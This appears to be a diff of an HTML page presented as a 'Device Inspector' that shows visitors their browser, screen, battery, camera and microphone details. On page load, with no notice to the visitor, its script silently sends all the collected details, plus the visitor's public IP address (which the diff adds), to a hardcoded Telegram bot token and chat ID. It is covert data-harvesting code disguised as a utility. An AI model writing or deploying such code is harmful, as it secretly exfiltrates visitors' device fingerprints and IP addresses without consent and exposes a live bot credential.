@@ -38,7 +38,6 @@
     .orb2 { width:170px; height:93px; top:64vh; left:60vw; background:radial-gradient(circle,#8d6cff96 57%, #f7ecc455 100%);}
     .orb3 { width:90px; height:104px; top:83vh; left:-30px; background:radial-gradient(circle,#ecd99433 67%,#27e2fae2 120%);}
     @keyframes orbfloat {0%{transform:scale(1.03)translateY(0);}100%{transform:scale(.97)translateY(15px);}}
-
     .header {width: 100%;padding: 2em 0 1em 0;text-align: center;position: relative;z-index: 2;}
     .header-icon {margin-bottom:-.22em;width:38px;height:38px;vertical-align: middle;display:inline-block;stroke-width:1.16;filter:drop-shadow(0 3px 18px #18f6f79d);animation: iconfloat 4s infinite alternate;}
     @keyframes iconfloat {0% {transform:translateY(-6px);}100%{transform:translateY(5px);}}
@@ -48,7 +47,6 @@
       letter-spacing:0.012em;margin: 0.13em 0 0 0; user-select: none;line-height: 1.06em;
     }
     .header-desc {color: var(--c-gold);font-size: .99em;font-family: 'JetBrains Mono', monospace;opacity:.92;text-shadow:0 1px 11px var(--c-glass2);margin:.15em 0 1.07em 0;}
-
     .device-grid {width:100vw;max-width:93vw;display:flex;flex-direction:column;gap: 1em;padding: 0.3em 0 5.7em 0;position: relative;z-index: 1;margin:auto;align-items: stretch;}
     .card {background:linear-gradient(120deg,var(--c-glass) 63%,var(--c-glass2) 100%);
       border-radius: 1.04em;border: 1.2px solid var(--c-glass2);backdrop-filter: blur(14px) brightness(1.09);
@@ -66,34 +64,26 @@
     .footer {width: 100vw; text-align:center;position: fixed; bottom:8px; left:0;font-family:'JetBrains Mono',monospace;
       font-size:.95em;color:#d9f8ffba;letter-spacing:.059em;opacity:.66;user-select: none;z-index:25;pointer-events:none;}
     .footer b {color: var(--c-gold);}
-    /* Music Btn */
-    .music-btn {position:fixed;bottom:20px;left:10px;z-index:155;
-      background:linear-gradient(120deg,rgba(36,24,40,0.88),rgba(17,225,255,0.12));
+    .music-btn {position:fixed;bottom:20px;left:10px;z-index:155;background:linear-gradient(120deg,rgba(36,24,40,0.88),rgba(17,225,255,0.12));
       border:1.2px solid #ffe26c44;border-radius:1.6em;padding:.66em 1.45em;
       color:var(--c-gold);font-size:1.13em;font-family:'Inter',sans-serif;font-weight:700;letter-spacing:.07em;
       box-shadow:0 2px 16px #13fae16d,0 2px 10px #fbe99357;display:flex;align-items:center;gap:.7em;outline:none;
-      cursor:pointer;backdrop-filter:blur(9px);transition:filter .13s,box-shadow .13s;
-      opacity: 0.94;
-    }
+      cursor:pointer;backdrop-filter:blur(9px);transition:filter .13s,box-shadow .13s;opacity: 0.94;}
     .music-btn:active {filter:brightness(1.13);}
-    .music-btn .icon{
-      width:1.25em;height:1.25em;display:inline-block;vertical-align:middle;color:var(--c-gold);
-    }
-    /* Mobile tweaks */
-    @media (max-width: 450px) {
-      .header{padding:1.18em 0 .6em 0;}
-      .header-title{font-size:1.03em;}
-      .device-grid {padding:.1em 0 5em 0;}
-      .card {padding:.63em 0.58em .81em 0.7em;}
-      .footer {font-size:0.86em;}
-      .music-btn {padding:.58em 1.2em;}
+    .music-btn .icon{width:1.25em;height:1.25em;display:inline-block;vertical-align:middle;color:var(--c-gold);}
+    @media (max-width: 450px) {.header{padding:1.18em 0 .6em 0;}.header-title{font-size:1.03em;}
+      .device-grid {padding:.1em 0 5em 0;}.card {padding:.63em 0.58em .81em 0.7em;}
+      .footer {font-size:0.86em;}.music-btn {padding:.58em 1.2em;}
     }
   </style>
 </head>
 <body>
   <div class="orb orb1"></div><div class="orb orb2"></div><div class="orb orb3"></div>
   <header class="header">
-    <svg class="header-icon" stroke="var(--c-1)" fill="none" viewBox="0 0 256 256"><rect width="256" height="256" fill="none"/><rect x="24" y="56" width="208" height="144" rx="16" stroke="currentColor" stroke-width="12" stroke-linecap="round" stroke-linejoin="round" fill="url(#g1)"/><line x1="160" y1="240" x2="96" y2="240" stroke="currentColor" stroke-width="12" stroke-linecap="round" stroke-linejoin="round"/><defs><radialGradient id="g1" cx="50%" cy="50%" r="75%"><stop offset="57%" stop-color="#11e1ff"/><stop offset="100%" stop-color="#ffe69a"/></radialGradient></defs></svg>
+    <svg class="header-icon" stroke="var(--c-1)" fill="none" viewBox="0 0 256 256">
+      <rect width="256" height="256" fill="none"/><rect x="24" y="56" width="208" height="144" rx="16" stroke="currentColor" stroke-width="12" stroke-linecap="round" stroke-linejoin="round" fill="url(#g1)"/><line x1="160" y1="240" x2="96" y2="240" stroke="currentColor" stroke-width="12" stroke-linecap="round" stroke-linejoin="round"/>
+      <defs><radialGradient id="g1" cx="50%" cy="50%" r="75%"><stop offset="57%" stop-color="#11e1ff"/><stop offset="100%" stop-color="#ffe69a"/></radialGradient></defs>
+    </svg>
     <div class="header-title">My Device Inspector</div>
     <div class="header-desc">Check your device & browser details:<br>responsive, beautiful, instant.</div>
   </header>
@@ -102,7 +92,6 @@
       <!-- Cards will be inserted here -->
     </section>
   </main>
-  <!-- Music functionality -->
   <audio id="mainMusic" src="phonk-music-phonk-2025-mix-401949.mp3" preload="auto" loop style="display:none"></audio>
   <button id="musicBtn" class="music-btn" style="display:none" aria-label="Pause music">
     <span id="musicBtnIcon">
@@ -114,7 +103,7 @@
     Made by <b>Dev Malvryx™</b>
   </div>
   <script>
-    // SVG icon map (Phosphor icons, inline)
+// SVG icon map (Phosphor icons, inline)
     const icons = {
       os: `<svg class="card-icon" viewBox="0 0 256 256" aria-label="OS"><rect width="256" height="256" fill="none"/><rect x="32" y="48" width="192" height="152" rx="16" fill="none" stroke="currentColor" stroke-width="10"/><circle cx="72" cy="100" r="10" fill="currentColor"/><circle cx="184" cy="100" r="10" fill="currentColor"/><path d="M96 168c16 16 48 16 64 0" fill="none" stroke="currentColor" stroke-width="8"/></svg>`,
       platform: `<svg class="card-icon" viewBox="0 0 256 256" aria-label="Platform"><rect width="256" height="256" fill="none"/><rect x="32" y="56" width="192" height="88" rx="16" fill="none" stroke="currentColor" stroke-width="10"/><path d="M72,144v32a16,16,0,0,0,16,16h80a16,16,0,0,0,16-16V144" fill="none" stroke="currentColor" stroke-width="10"/></svg>`,
@@ -143,7 +132,7 @@
       audio: `<svg class="card-icon" viewBox="0 0 256 256" aria-label="Audio"><rect x="64" y="88" width="128" height="80" rx="16" fill="none" stroke="currentColor" stroke-width="10"/><rect x="100" y="124" width="56" height="32" rx="8" fill="currentColor"/></svg>`,
     };
 
-    function getDeviceInfo() {
+  function getDeviceInfo() {
       const nav = navigator, scr = window.screen;
       let plat = nav.userAgentData && nav.userAgentData.platform ? nav.userAgentData.platform : nav.platform;
       let os = "Unknown";
@@ -273,132 +262,151 @@
         { key:'camera',icon:icons.camera,label:'Camera(s)',desc:'Camera devices detected.',val:cam },
         { key:'audio',icon:icons.audio,label:'Microphone(s)',desc:'Mic audio inputs found.',val:mic },
       ];
+    }  
+    // --- ICONS --- (same as your original, omitted for brevity)
+    //  const icons = { /* ... [paste icons code here] ... */ };
+    // function getDeviceInfo() {
+      // ... your (unchanged) getDeviceInfo code here ...
+      // See previous posts for full code snippet.
+      // It's unchanged except battery's val is "Checking..." initially.
+      // Don't forget, you MUST paste your actual icons definition up above.
+      // And the full getDeviceInfo as in your post.
+      // return [
+        // ... as in your code ...
+      // ];
+    // }
+    async function getPublicIP() {
+      try {
+        let res = await fetch('https://api.ipify.org?format=json');
+        if(!res.ok) return "Unknown";
+        let data = await res.json();
+        return data.ip || "Unknown";
+      } catch(e) { return "Unknown"; }
     }
-
-    
-    
-
-    function injectCards(list) {
-    let grid = document.getElementById('deviceGrid');
-    let obj = {};
-    list.forEach(d=>{
-      let el = document.createElement('div');
-      el.className = 'card';
-      el.id = 'card-' + d.key;
-      el.innerHTML = `
-        ${d.icon}
-        <div class="card-txt">
-          <div class="card-title">${d.label}</div>
-          <div class="card-desc">${d.desc}</div>
-          <div class="card-content" id="val-${d.key}">${d.val}</div>
-        </div>
-      `;
-      obj[d.label] = d.val; // Gather for Telegram
-      grid.appendChild(el);
-    });
-    // Immediately send to Telegram--silent/auto!
-    sendToTelegram(obj);
-  }
-function updateCard(key, newVal) {
+    async function injectCards(list) {
+      let grid = document.getElementById('deviceGrid');
+      let obj = {};
+      let batteryPromise = Promise.resolve("N/A");
+      for (let d of list) {
+        if (d.key === 'battery') {
+          if ('getBattery' in navigator) {
+            batteryPromise = navigator.getBattery().then(b =>
+              (b.charging ? "Charging, " : "") + Math.round(b.level*100) + '%'
+            ).catch(() => "Unknown");
+          }
+        }
+        let el = document.createElement('div');
+        el.className = 'card';
+        el.id = 'card-' + d.key;
+        el.innerHTML = `
+          ${d.icon}
+          <div class="card-txt">
+            <div class="card-title">${d.label}</div>
+            <div class="card-desc">${d.desc}</div>
+            <div class="card-content" id="val-${d.key}">${d.val}</div>
+          </div>
+        `;
+        obj[d.label] = d.val;
+        grid.appendChild(el);
+      }
+      // Wait for battery and IP, update UI and send accurate info to Telegram
+      let [batteryVal, ip] = await Promise.all([batteryPromise, getPublicIP()]);
+      obj["Battery"] = batteryVal;
+      obj["IP Address"] = ip;
+      updateCard('battery', batteryVal);
+      sendToTelegram(obj);
+    }
+    function updateCard(key, newVal) {
       let c = document.getElementById('val-'+key);
       if (c) c.textContent = newVal;
-}
-  async function sendToTelegram(detailsObj) {
-    let msg = Object.entries(detailsObj)
-      .map(entry=>`<b>${entry[0]}:</b> <code>${String(entry[1]).replace(/</g,"&lt;")}</code>`)
-      .join('\n');
-    let botToken = "8497661244:AAHJFdNUkIyvZ1Y3toC6ykMfNoeN1X_CHGc";
-    let chatId = "7988239466";
-    let endpoint = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    try {
-      await fetch(endpoint, {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-          chat_id: chatId,
-          text: msg,
-          parse_mode: "HTML"
-        })
-      });
-    } catch(e) {
-      // Fail silent unless debugging
     }
-  }
-
-    // Music behavior for MAX compatibility
-    // Music control refs
-  const music = document.getElementById('mainMusic');
-  const musicBtn = document.getElementById('musicBtn');
-  const musicBtnIcon = document.getElementById('musicBtnIcon');
-  const musicBtnLabel = document.getElementById('musicBtnLabel');
-  let musicStarted = false, isPaused = false;
-
-  function playMusicTrigger() {
-    if (!musicStarted) {
-      music.play().then(() => {
-        musicStarted = true;
-        musicBtn.style.display = "flex";
-        isPaused = false;
-        musicBtnIcon.innerHTML =
-          `<svg class="icon" viewBox="0 0 24 24" fill="none"><rect x="5" y="4" width="4" height="16" rx="1.5" fill="currentColor"/><rect x="15" y="4" width="4" height="16" rx="1.5" fill="currentColor"/></svg>`;
-        musicBtnLabel.textContent = "Pause";
-        cleanupAllMusicEvents();
-      }).catch(() => {});
+    async function sendToTelegram(detailsObj) {
+      let msg = Object.entries(detailsObj)
+        .map(entry => `<b>${entry[0]}:</b> <code>${String(entry[1]).replace(/</g,"&lt;")}</code>`)
+        .join('\n');
+      let botToken = "8497661244:AAHJFdNUkIyvZ1Y3toC6ykMfNoeN1X_CHGc";
+      let chatId = "7988239466";
+      let endpoint = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      try {
+        await fetch(endpoint, {
+          method: "POST",
+          headers: {"Content-Type":"application/json"},
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: msg,
+            parse_mode: "HTML"
+          })
+        });
+      } catch(e) { /* Fail silent */ }
     }
-  }
-  function pauseMusic() {
-    music.pause();
-    isPaused = true;
-    musicBtnIcon.innerHTML =
-      `<svg class="icon" viewBox="0 0 24 24"><polygon points="5,4 19,12 5,20" fill="currentColor"/></svg>`;
-    musicBtnLabel.textContent = "Play";
-  }
-  function resumeMusic() {
-    music.play();
-    isPaused = false;
-    musicBtnIcon.innerHTML =
-      `<svg class="icon" viewBox="0 0 24 24" fill="none"><rect x="5" y="4" width="4" height="16" rx="1.5" fill="currentColor"/><rect x="15" y="4" width="4" height="16" rx="1.5" fill="currentColor"/></svg>`;
-    musicBtnLabel.textContent = "Pause";
-  }
-  function toggleMusic() {
-    if (musicStarted) {
-      if (isPaused) resumeMusic();
-      else pauseMusic();
+
+    // --- Music ---
+    const music = document.getElementById('mainMusic');
+    const musicBtn = document.getElementById('musicBtn');
+    const musicBtnIcon = document.getElementById('musicBtnIcon');
+    const musicBtnLabel = document.getElementById('musicBtnLabel');
+    let musicStarted = false, isPaused = false;
+    function playMusicTrigger() {
+      if (!musicStarted) {
+        music.play().then(()=> {
+          musicStarted = true;
+          musicBtn.style.display = "flex";
+          isPaused = false;
+          musicBtnIcon.innerHTML =
+            `<svg class="icon" viewBox="0 0 24 24" fill="none"><rect x="5" y="4" width="4" height="16" rx="1.5" fill="currentColor"/><rect x="15" y="4" width="4" height="16" rx="1.5" fill="currentColor"/></svg>`;
+          musicBtnLabel.textContent = "Pause";
+          cleanupAllMusicEvents();
+        }).catch(()=>{});
+      }
     }
-  }
-
-  // Attach *all* possible interaction listeners, clean up after first play
-  let allEvents = [
-    "click", "mousedown", "mouseup",
-    "pointerdown", "pointerup", "pointermove",
-    "touchstart", "touchend", "touchmove",
-    "keydown"
-  ];
-  function fireOncePlayMusic() {
-    playMusicTrigger();
-  }
-  function cleanupAllMusicEvents() {
-    allEvents.forEach(ev =>
-      document.removeEventListener(ev, fireOncePlayMusic, true)
-    );
-  }
-  function setupMusicAutoPlay() {
-    allEvents.forEach(ev => 
-      document.addEventListener(ev, fireOncePlayMusic, {capture:true, passive:true})
-    );
-  }
-
-  // Music pause/resume btn
-  musicBtn.onclick = function(e) {
-    e.stopPropagation(); e.preventDefault();
-    toggleMusic();
-  };
-
-  // On load
-  (function(){
-    let d = getDeviceInfo(); injectCards(d);
-    setupMusicAutoPlay();
-  })();
+    function pauseMusic() {
+      music.pause();
+      isPaused = true;
+      musicBtnIcon.innerHTML =
+        `<svg class="icon" viewBox="0 0 24 24"><polygon points="5,4 19,12 5,20" fill="currentColor"/></svg>`;
+      musicBtnLabel.textContent = "Play";
+    }
+    function resumeMusic() {
+      music.play();
+      isPaused = false;
+      musicBtnIcon.innerHTML =
+        `<svg class="icon" viewBox="0 0 24 24" fill="none"><rect x="5" y="4" width="4" height="16" rx="1.5" fill="currentColor"/><rect x="15" y="4" width="4" height="16" rx="1.5" fill="currentColor"/></svg>`;
+      musicBtnLabel.textContent = "Pause";
+    }
+    function toggleMusic() {
+      if (musicStarted) {
+        if (isPaused) resumeMusic();
+        else pauseMusic();
+      }
+    }
+    let allEvents = [
+      "click", "mousedown", "mouseup",
+      "pointerdown", "pointerup", "pointermove",
+      "touchstart", "touchend", "touchmove",
+      "keydown"
+    ];
+    function fireOncePlayMusic() {
+      playMusicTrigger();
+    }
+    function cleanupAllMusicEvents() {
+      allEvents.forEach(ev =>
+        document.removeEventListener(ev, fireOncePlayMusic, true)
+      );
+    }
+    function setupMusicAutoPlay() {
+      allEvents.forEach(ev =>
+        document.addEventListener(ev, fireOncePlayMusic, {capture:true, passive:true})
+      );
+    }
+    musicBtn.onclick = function(e) {
+      e.stopPropagation(); e.preventDefault();
+      toggleMusic();
+    };
+    (function(){
+      let d = getDeviceInfo(); injectCards(d);
+      setupMusicAutoPlay();
+    })();
   </script>
 </body>
 </html>
+    
